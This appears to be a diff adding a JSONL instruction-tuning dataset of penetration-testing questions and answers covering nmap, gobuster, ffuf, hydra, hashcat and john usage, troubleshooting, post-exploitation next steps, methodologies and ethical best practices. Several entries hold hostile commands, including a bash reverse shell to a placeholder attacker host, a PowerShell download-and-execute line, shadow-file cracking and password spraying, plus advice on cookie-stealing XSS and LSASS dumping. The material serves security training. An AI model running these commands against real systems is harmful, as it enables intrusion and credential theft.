@@ -1,0 +1,140 @@
+{"instruction": "How do I use nmap to run a SYN scan?", "input": "", "output": "Use: nmap -sS TARGET\n\nSYN scan is stealthy (half-open), fast, and requires root."}
+{"instruction": "How do I use nmap to detect service versions?", "input": "", "output": "Use: nmap -sV TARGET\n\nVersion detection probes open ports to identify services."}
+{"instruction": "How do I use nmap to run all default scripts?", "input": "", "output": "Use: nmap -sC TARGET\n\nRuns default NSE scripts for common enumeration."}
+{"instruction": "How do I use nmap to scan all ports?", "input": "", "output": "Use: nmap -p- TARGET\n\nScans all 65535 ports instead of just top 1000."}
+{"instruction": "How do I use nmap to do aggressive scan?", "input": "", "output": "Use: nmap -A TARGET\n\nCombines OS detection, version detection, scripts, traceroute."}
+{"instruction": "How do I use nmap to scan UDP ports?", "input": "", "output": "Use: nmap -sU TARGET\n\nUDP scan is slow, often blocked by firewalls."}
+{"instruction": "How do I use nmap to output all formats?", "input": "", "output": "Use: nmap -oA filename TARGET\n\nSaves output in normal, XML, and grepable formats."}
+{"instruction": "How do I use nmap to increase verbosity?", "input": "", "output": "Use: nmap -v or -vv TARGET\n\nShows more information during scan progress."}
+{"instruction": "How do I use nmap to skip ping check?", "input": "", "output": "Use: nmap -Pn TARGET\n\nAssumes host is up, useful when ICMP blocked."}
+{"instruction": "How do I use nmap to scan specific ports?", "input": "", "output": "Use: nmap -p22,80,443 TARGET\n\nOnly scans specified ports."}
+{"instruction": "How do I use gobuster to directory brute force?", "input": "", "output": "Use: gobuster dir -u URL -w wordlist\n\nDiscovers hidden directories and files."}
+{"instruction": "How do I use gobuster to subdomain enumeration?", "input": "", "output": "Use: gobuster dns -d DOMAIN -w wordlist\n\nFinds subdomains via DNS brute forcing."}
+{"instruction": "How do I use gobuster to vhost enumeration?", "input": "", "output": "Use: gobuster vhost -u URL -w wordlist\n\nDiscovers virtual hosts on target."}
+{"instruction": "How do I use gobuster to add file extensions?", "input": "", "output": "Use: gobuster dir -u URL -w wordlist -x php,txt,bak\n\nChecks for files with these extensions."}
+{"instruction": "How do I use gobuster to follow redirects?", "input": "", "output": "Use: gobuster dir -u URL -w wordlist -r\n\nFollows HTTP redirects."}
+{"instruction": "How do I use gobuster to hide status codes?", "input": "", "output": "Use: gobuster dir -u URL -w wordlist -b 404,403\n\nHides specified status codes from output."}
+{"instruction": "How do I use gobuster to increase threads?", "input": "", "output": "Use: gobuster dir -u URL -w wordlist -t 50\n\nUses 50 threads for faster scanning."}
+{"instruction": "How do I use gobuster to add cookies?", "input": "", "output": "Use: gobuster dir -u URL -w wordlist -c 'session=xyz'\n\nIncludes cookies in requests."}
+{"instruction": "How do I use gobuster to custom user agent?", "input": "", "output": "Use: gobuster dir -u URL -w wordlist -a 'Mozilla/5.0'\n\nSets custom User-Agent header."}
+{"instruction": "How do I use gobuster to output to file?", "input": "", "output": "Use: gobuster dir -u URL -w wordlist -o output.txt\n\nSaves results to file."}
+{"instruction": "How do I use ffuf to basic directory fuzzing?", "input": "", "output": "Use: ffuf -u URL/FUZZ -w wordlist\n\nFUZZ keyword replaced with wordlist entries."}
+{"instruction": "How do I use ffuf to parameter fuzzing?", "input": "", "output": "Use: ffuf -u 'URL?param=FUZZ' -w wordlist\n\nFuzzes parameter values."}
+{"instruction": "How do I use ffuf to POST data fuzzing?", "input": "", "output": "Use: ffuf -u URL -X POST -d 'user=FUZZ' -w wordlist\n\nFuzzes POST body data."}
+{"instruction": "How do I use ffuf to filter by size?", "input": "", "output": "Use: ffuf -u URL/FUZZ -w wordlist -fs 0\n\nFilters responses by size."}
+{"instruction": "How do I use ffuf to filter by words?", "input": "", "output": "Use: ffuf -u URL/FUZZ -w wordlist -fw 1\n\nFilters responses by word count."}
+{"instruction": "How do I use ffuf to recursive fuzzing?", "input": "", "output": "Use: ffuf -u URL/FUZZ -w wordlist -recursion\n\nRecursively fuzzes found directories."}
+{"instruction": "How do I use ffuf to match status codes?", "input": "", "output": "Use: ffuf -u URL/FUZZ -w wordlist -mc 200,301\n\nOnly shows specified status codes."}
+{"instruction": "How do I use ffuf to add header?", "input": "", "output": "Use: ffuf -u URL/FUZZ -w wordlist -H 'Authorization: Bearer token'\n\nAdds custom header."}
+{"instruction": "How do I use ffuf to virtual host fuzzing?", "input": "", "output": "Use: ffuf -u URL -H 'Host: FUZZ.domain.com' -w wordlist\n\nFuzzes Host header for vhosts."}
+{"instruction": "How do I use ffuf to multiple wordlists?", "input": "", "output": "Use: ffuf -u URL/FUZZ/FUZ2Z -w wordlist:FUZZ -w wordlist2:FUZ2Z\n\nUses multiple fuzz points."}
+{"instruction": "How do I use hydra to SSH brute force?", "input": "", "output": "Use: hydra -l user -P passwords.txt ssh://TARGET\n\nBrute forces SSH with password list."}
+{"instruction": "How do I use hydra to HTTP POST login?", "input": "", "output": "Use: hydra -l admin -P passwords.txt TARGET http-post-form '/login:user=^USER^&pass=^PASS^:F=Failed'\n\nBrute forces HTTP POST login."}
+{"instruction": "How do I use hydra to FTP brute force?", "input": "", "output": "Use: hydra -L users.txt -P passwords.txt ftp://TARGET\n\nBrute forces FTP with user and pass lists."}
+{"instruction": "How do I use hydra to use single password?", "input": "", "output": "Use: hydra -l user -p password123 ssh://TARGET\n\nTests single credential pair."}
+{"instruction": "How do I use hydra to spray password?", "input": "", "output": "Use: hydra -L users.txt -p Summer2024! smb://TARGET\n\nPassword spraying against multiple users."}
+{"instruction": "How do I use hydra to set threads?", "input": "", "output": "Use: hydra -t 4 -l admin -P passwords.txt TARGET ssh\n\nUses 4 parallel connections."}
+{"instruction": "How do I use hydra to verbose output?", "input": "", "output": "Use: hydra -V -l admin -P passwords.txt TARGET ssh\n\nShows each attempt."}
+{"instruction": "How do I use hydra to stop on success?", "input": "", "output": "Use: hydra -f -l admin -P passwords.txt TARGET ssh\n\nStops when valid creds found."}
+{"instruction": "How do I use hydra to RDP brute force?", "input": "", "output": "Use: hydra -l admin -P passwords.txt rdp://TARGET\n\nBrute forces RDP."}
+{"instruction": "How do I use hydra to MySQL brute force?", "input": "", "output": "Use: hydra -l root -P passwords.txt mysql://TARGET\n\nBrute forces MySQL."}
+{"instruction": "How do I use hashcat to crack NTLM?", "input": "", "output": "Use: hashcat -m 1000 hash.txt wordlist.txt\n\nMode 1000 for NTLM hashes."}
+{"instruction": "How do I use hashcat to crack MD5?", "input": "", "output": "Use: hashcat -m 0 hash.txt wordlist.txt\n\nMode 0 for raw MD5."}
+{"instruction": "How do I use hashcat to crack SHA256?", "input": "", "output": "Use: hashcat -m 1400 hash.txt wordlist.txt\n\nMode 1400 for raw SHA256."}
+{"instruction": "How do I use hashcat to use rules?", "input": "", "output": "Use: hashcat -m 0 hash.txt wordlist.txt -r best64.rule\n\nApplies transformation rules."}
+{"instruction": "How do I use hashcat to brute force?", "input": "", "output": "Use: hashcat -m 0 hash.txt -a 3 ?a?a?a?a?a?a\n\nMask attack with 6 chars."}
+{"instruction": "How do I use hashcat to show cracked?", "input": "", "output": "Use: hashcat -m 0 hash.txt --show\n\nShows already cracked hashes."}
+{"instruction": "How do I use hashcat to Kerberos TGS?", "input": "", "output": "Use: hashcat -m 13100 hash.txt wordlist.txt\n\nMode 13100 for Kerberoasting."}
+{"instruction": "How do I use hashcat to NetNTLMv2?", "input": "", "output": "Use: hashcat -m 5600 hash.txt wordlist.txt\n\nMode 5600 for NTLMv2."}
+{"instruction": "How do I use hashcat to hybrid attack?", "input": "", "output": "Use: hashcat -m 0 hash.txt wordlist.txt -a 6 ?d?d?d\n\nWordlist + mask."}
+{"instruction": "How do I use hashcat to set workload?", "input": "", "output": "Use: hashcat -m 0 hash.txt wordlist.txt -w 3\n\nWorkload profile (1-4)."}
+{"instruction": "How do I use john to crack password file?", "input": "", "output": "Use: john hash.txt --wordlist=wordlist.txt\n\nBasic dictionary attack."}
+{"instruction": "How do I use john to show cracked?", "input": "", "output": "Use: john hash.txt --show\n\nShows cracked passwords."}
+{"instruction": "How do I use john to specify format?", "input": "", "output": "Use: john hash.txt --format=Raw-MD5\n\nSpecifies hash format."}
+{"instruction": "How do I use john to incremental mode?", "input": "", "output": "Use: john hash.txt --incremental\n\nBrute force with optimized charset."}
+{"instruction": "How do I use john to use rules?", "input": "", "output": "Use: john hash.txt --wordlist=wordlist.txt --rules\n\nApplies word mangling rules."}
+{"instruction": "How do I use john to crack shadow file?", "input": "", "output": "Use: john /etc/shadow --wordlist=wordlist.txt\n\nCracks Linux password hashes."}
+{"instruction": "How do I use john to crack zip file?", "input": "", "output": "Use: john zip2john file.zip > hash.txt && john hash.txt\n\nExtracts and cracks ZIP password."}
+{"instruction": "How do I use john to resume session?", "input": "", "output": "Use: john --restore=sessionname\n\nResumes previous cracking session."}
+{"instruction": "How do I use john to fork processes?", "input": "", "output": "Use: john hash.txt --fork=4\n\nUses 4 processes."}
+{"instruction": "How do I use john to list formats?", "input": "", "output": "Use: john --list=formats\n\nShows all supported hash formats."}
+{"instruction": "I'm getting 'Connection refused' error during my pentest. What should I do?", "input": "", "output": "Target port is closed or filtered. Verify service is running, check firewall rules, try different port or protocol."}
+{"instruction": "I'm getting 'Connection timed out' error during my pentest. What should I do?", "input": "", "output": "Network path blocked or host down. Check connectivity (ping), verify network route, try from different source IP."}
+{"instruction": "I'm getting 'Permission denied' error during my pentest. What should I do?", "input": "", "output": "Insufficient privileges. Run with sudo if needed, check file permissions, verify you're targeting correct resource."}
+{"instruction": "I'm getting 'Host unreachable' error during my pentest. What should I do?", "input": "", "output": "No route to host. Check if host exists, verify network configuration, ensure no firewall blocking."}
+{"instruction": "I'm getting 'Authentication failed' error during my pentest. What should I do?", "input": "", "output": "Wrong credentials. Double-check username/password, verify authentication method, check for account lockout."}
+{"instruction": "I'm getting 'SSL certificate error' error during my pentest. What should I do?", "input": "", "output": "Certificate issue. Use -k/--insecure flag to ignore, or import certificate. May indicate MITM if unexpected."}
+{"instruction": "I'm getting 'Name resolution failed' error during my pentest. What should I do?", "input": "", "output": "DNS lookup failed. Check DNS settings, try using IP instead, verify hostname spelling."}
+{"instruction": "I'm getting 'Socket already in use' error during my pentest. What should I do?", "input": "", "output": "Port already bound. Kill existing process, use different port, wait for socket timeout."}
+{"instruction": "I'm getting 'Out of memory' error during my pentest. What should I do?", "input": "", "output": "Process used too much RAM. Reduce scope, use lighter tools, increase system resources."}
+{"instruction": "I'm getting 'File not found' error during my pentest. What should I do?", "input": "", "output": "Path incorrect or file deleted. Verify file exists, check path syntax, ensure permissions."}
+{"instruction": "I'm getting 'Syntax error in payload' error during my pentest. What should I do?", "input": "", "output": "Malformed exploit code. Review payload syntax, check for encoding issues, verify target compatibility."}
+{"instruction": "I'm getting 'Module not found' error during my pentest. What should I do?", "input": "", "output": "Missing dependency. Install required module (pip install X), check Python path, verify environment."}
+{"instruction": "I'm getting 'Access denied to network share' error during my pentest. What should I do?", "input": "", "output": "SMB permissions issue. Check share permissions, verify credentials, try different authentication."}
+{"instruction": "I'm getting 'HTTP 403 Forbidden' error during my pentest. What should I do?", "input": "", "output": "Server denied access. May need authentication, different user agent, or bypassing WAF."}
+{"instruction": "I'm getting 'HTTP 500 Internal Server Error' error during my pentest. What should I do?", "input": "", "output": "Server-side error. Your input may have crashed application - potential vulnerability indicator."}
+{"instruction": "I'm getting 'Database connection failed' error during my pentest. What should I do?", "input": "", "output": "Can't connect to database. Verify credentials, check port, ensure database is running."}
+{"instruction": "I'm getting 'Invalid certificate chain' error during my pentest. What should I do?", "input": "", "output": "SSL/TLS issue. Certificate may be self-signed or expired. Use appropriate flags to bypass if intentional."}
+{"instruction": "I'm getting 'Rate limit exceeded' error during my pentest. What should I do?", "input": "", "output": "Too many requests. Slow down requests, use delays between attempts, rotate source IPs."}
+{"instruction": "I'm getting 'Segmentation fault' error during my pentest. What should I do?", "input": "", "output": "Memory access violation. Exploit may have crashed - adjust payload, check offsets."}
+{"instruction": "I'm getting 'Firewall blocking traffic' error during my pentest. What should I do?", "input": "", "output": "Packets filtered. Try different protocols, use tunneling, test from different source."}
+{"instruction": "I found an open FTP port. What should I do next?", "input": "During authorized penetration test", "output": "Check for anonymous access (user: anonymous, pass: email). Enumerate version for known vulnerabilities. Check for upload permissions to web-accessible directories."}
+{"instruction": "I captured a NetNTLMv2 hash. What should I do next?", "input": "During authorized penetration test", "output": "Crack with hashcat -m 5600 or relay it with ntlmrelayx to other systems. Check if SMB signing is disabled for relay attacks."}
+{"instruction": "I found default credentials working. What should I do next?", "input": "During authorized penetration test", "output": "Document finding. Use access to explore further. Check if same creds work elsewhere. Verify scope before accessing additional systems."}
+{"instruction": "I discovered .git folder exposed. What should I do next?", "input": "During authorized penetration test", "output": "Use git-dumper to download repository. Search for credentials, API keys, sensitive configs in history. Check git log for sensitive commits."}
+{"instruction": "I found SQL injection. What should I do next?", "input": "During authorized penetration test", "output": "Determine database type. Extract database schema. Dump sensitive tables. Try to escalate to OS command execution if possible (xp_cmdshell, etc.)."}
+{"instruction": "I found XSS vulnerability. What should I do next?", "input": "During authorized penetration test", "output": "Determine XSS type (stored/reflected/DOM). Craft payload for cookie theft or keylogging. Document impact for report."}
+{"instruction": "I have local admin on a workstation. What should I do next?", "input": "During authorized penetration test", "output": "Dump SAM/LSASS for credentials. Check for cached domain creds. Enumerate network shares. Look for sensitive files and persistence opportunities."}
+{"instruction": "I discovered internal Jenkins. What should I do next?", "input": "During authorized penetration test", "output": "Check for authentication bypass, weak creds, or anonymous access. Jenkins script console provides immediate RCE if accessible."}
+{"instruction": "I found exposed Docker API. What should I do next?", "input": "During authorized penetration test", "output": "List containers, images. Execute commands in containers. Check for privileged containers that allow host escape."}
+{"instruction": "I compromised a web server. What should I do next?", "input": "During authorized penetration test", "output": "Establish persistence. Enumerate internal network. Check for sensitive files, database connections, API keys. Pivot to internal targets."}
+{"instruction": "I found S3 bucket with public access. What should I do next?", "input": "During authorized penetration test", "output": "List contents, download sensitive files. Check for upload permissions. Document everything for report."}
+{"instruction": "I captured WPA handshake. What should I do next?", "input": "During authorized penetration test", "output": "Crack with hashcat -m 22000 or aircrack-ng. Use wordlists, rules, or brute force depending on complexity expectations."}
+{"instruction": "I found LDAP with anonymous bind. What should I do next?", "input": "During authorized penetration test", "output": "Enumerate users, groups, computers. Extract useful attributes. Look for passwords in description fields."}
+{"instruction": "I have access to domain user account. What should I do next?", "input": "During authorized penetration test", "output": "Run BloodHound for attack paths. Check for Kerberoastable accounts. Enumerate shares you can access. Look for privilege escalation paths."}
+{"instruction": "I found password in GitHub commit. What should I do next?", "input": "During authorized penetration test", "output": "Try credential against all services. Check if rotated. Document for report as credential hygiene issue."}
+{"instruction": "I got shell on Linux server. What should I do next?", "input": "During authorized penetration test", "output": "Stabilize shell (python pty). Run LinPEAS for escalation paths. Check crontab, SUID, sudo permissions. Enumerate network."}
+{"instruction": "I found SSRF vulnerability. What should I do next?", "input": "During authorized penetration test", "output": "Try accessing internal IPs (127.0.0.1, 169.254.169.254). Scan internal ports. Try to access cloud metadata endpoints."}
+{"instruction": "I have domain admin credentials. What should I do next?", "input": "During authorized penetration test", "output": "Dump NTDS.dit for all domain hashes. Create golden/silver tickets. Document all findings before making changes."}
+{"instruction": "I found exposed Kubernetes API. What should I do next?", "input": "During authorized penetration test", "output": "List pods, secrets, configmaps. Check for privileged pods. Look for service account tokens with elevated permissions."}
+{"instruction": "I discovered insecure deserialization. What should I do next?", "input": "During authorized penetration test", "output": "Identify serialization format. Find gadget chain for RCE. Use ysoserial/PHPGGC/similar for payload generation."}
+{"instruction": "What are the common web ports?", "input": "", "output": "80 (HTTP), 443 (HTTPS), 8080 (HTTP Proxy), 8443 (HTTPS Alt), 3000/5000/8000 (Dev servers)"}
+{"instruction": "What are the common database ports?", "input": "", "output": "3306 (MySQL), 5432 (PostgreSQL), 1433 (MSSQL), 1521 (Oracle), 27017 (MongoDB), 6379 (Redis)"}
+{"instruction": "What are the common Windows ports?", "input": "", "output": "135 (RPC), 139 (NetBIOS), 445 (SMB), 3389 (RDP), 5985/5986 (WinRM)"}
+{"instruction": "What are the common Linux service ports?", "input": "", "output": "22 (SSH), 21 (FTP), 23 (Telnet), 25 (SMTP), 53 (DNS), 111 (RPC)"}
+{"instruction": "What are the Metasploit basic commands?", "input": "", "output": "msfconsole, search, use, show options, set, exploit/run, sessions, background"}
+{"instruction": "What are the Netcat listener?", "input": "", "output": "nc -lvnp PORT (Linux) or nc.exe -lvnp PORT (Windows)"}
+{"instruction": "What are the Python simple server?", "input": "", "output": "python3 -m http.server PORT serves current directory"}
+{"instruction": "What are the Bash reverse shell?", "input": "", "output": "bash -i >& /dev/tcp/ATTACKER/PORT 0>&1"}
+{"instruction": "What are the PowerShell download?", "input": "", "output": "IEX(New-Object Net.WebClient).DownloadString('http://URL/script.ps1')"}
+{"instruction": "What are the curl POST request?", "input": "", "output": "curl -X POST -d 'data=value' URL"}
+{"instruction": "What are the wget download?", "input": "", "output": "wget URL -O output_filename"}
+{"instruction": "What are the base64 encode/decode?", "input": "", "output": "echo 'text' | base64 (encode) | base64 -d (decode)"}
+{"instruction": "What are the find SUID binaries?", "input": "", "output": "find / -perm -4000 -type f 2>/dev/null"}
+{"instruction": "What are the check sudo permissions?", "input": "", "output": "sudo -l shows what you can run as sudo"}
+{"instruction": "What are the Windows whoami?", "input": "", "output": "whoami /all shows user, groups, and privileges"}
+{"instruction": "What are the Linux capabilities?", "input": "", "output": "getcap -r / 2>/dev/null finds binaries with capabilities"}
+{"instruction": "What are the check listening ports Linux?", "input": "", "output": "ss -tlnp or netstat -tlnp"}
+{"instruction": "What are the check listening ports Windows?", "input": "", "output": "netstat -ano"}
+{"instruction": "What are the DNS lookup?", "input": "", "output": "dig domain.com or nslookup domain.com"}
+{"instruction": "What are the SSL certificate info?", "input": "", "output": "openssl s_client -connect host:443 | openssl x509 -text"}
+{"instruction": "Explain the OWASP Top 10 categories.", "input": "", "output": "A01: Broken Access Control, A02: Cryptographic Failures, A03: Injection, A04: Insecure Design, A05: Security Misconfiguration, A06: Vulnerable Components, A07: Authentication Failures, A08: Data Integrity Failures, A09: Logging Failures, A10: SSRF"}
+{"instruction": "Explain the pentest phases.", "input": "", "output": "1. Reconnaissance (info gathering), 2. Scanning (port/vuln scanning), 3. Gaining Access (exploitation), 4. Maintaining Access (persistence), 5. Analysis & Reporting"}
+{"instruction": "Explain the web app testing checklist.", "input": "", "output": "Authentication, Authorization, Input Validation, Output Encoding, Session Management, Cryptography, Error Handling, Business Logic, File Upload, API Security"}
+{"instruction": "Explain the network pentest approach.", "input": "", "output": "1. Host discovery, 2. Port scanning, 3. Service enumeration, 4. Vulnerability scanning, 5. Exploitation, 6. Post-exploitation, 7. Documentation"}
+{"instruction": "Explain the Active Directory attack path.", "input": "", "output": "1. Get foothold, 2. Enumerate domain, 3. Identify targets, 4. Kerberoast/AS-REP, 5. Escalate privileges, 6. Move laterally, 7. Domain admin, 8. Persistence"}
+{"instruction": "Explain the privilege escalation methodology.", "input": "", "output": "1. Enumerate current privileges, 2. Check for misconfigurations, 3. Search for credentials, 4. Look for vulnerable services, 5. Check for kernel exploits"}
+{"instruction": "Explain the wireless pentest steps.", "input": "", "output": "1. Monitor mode, 2. Discover networks, 3. Capture handshake, 4. Crack passphrase, 5. Connect and enumerate, 6. Pivot to wired network"}
+{"instruction": "Explain the cloud pentest approach.", "input": "", "output": "1. Enumerate cloud resources, 2. Check IAM policies, 3. Test for misconfigurations, 4. Look for exposed data, 5. Check for privilege escalation paths"}
+{"instruction": "Explain the social engineering phases.", "input": "", "output": "1. Research target, 2. Develop pretext, 3. Build rapport, 4. Exploit trust, 5. Execute attack, 6. Document"}
+{"instruction": "Explain the bug bounty workflow.", "input": "", "output": "1. Scope review, 2. Recon & mapping, 3. Vulnerability discovery, 4. Exploitation/PoC, 5. Document & report, 6. Follow up"}
+{"instruction": "What are the best practices for report writing in penetration testing?", "input": "", "output": "Be clear and concise. Include evidence (screenshots, logs). Provide remediation steps. Rate severity consistently. Executive summary for management, technical details for teams."}
+{"instruction": "What are the best practices for scope management in penetration testing?", "input": "", "output": "Always verify scope in writing. Test only authorized systems. If unsure, ask. Document all scope limitations and exceptions."}
+{"instruction": "What are the best practices for client communication in penetration testing?", "input": "", "output": "Regular updates. Immediate notification for critical findings. Clear documentation. Professional tone. Manage expectations."}
+{"instruction": "What are the best practices for evidence collection in penetration testing?", "input": "", "output": "Screenshot everything. Save tool output. Record timestamps. Document your methodology. Maintain chain of custody."}
+{"instruction": "What are the best practices for operational security in penetration testing?", "input": "", "output": "Use dedicated testing systems. Encrypt sensitive data. Don't leave backdoors. Clean up after testing. Protect client data."}
+{"instruction": "What are the best practices for tool selection in penetration testing?", "input": "", "output": "Use right tool for the job. Verify tool output manually. Keep tools updated. Understand what each tool does."}
+{"instruction": "What are the best practices for safe exploitation in penetration testing?", "input": "", "output": "Test in lab first. Have rollback plan. Start with least invasive. Document changes. Know how to recover."}
+{"instruction": "What are the best practices for credential handling in penetration testing?", "input": "", "output": "Never share creds insecurely. Document where found. Test reuse carefully. Report in encrypted manner."}
+{"instruction": "What are the best practices for network testing safety in penetration testing?", "input": "", "output": "Avoid DoS unless scoped. Be careful with broadcast. Watch bandwidth usage. Don't disrupt production."}
+{"instruction": "What are the best practices for legal considerations in penetration testing?", "input": "", "output": "Written authorization required. Stay in scope. Know local laws. Document everything. Have liability insurance."}
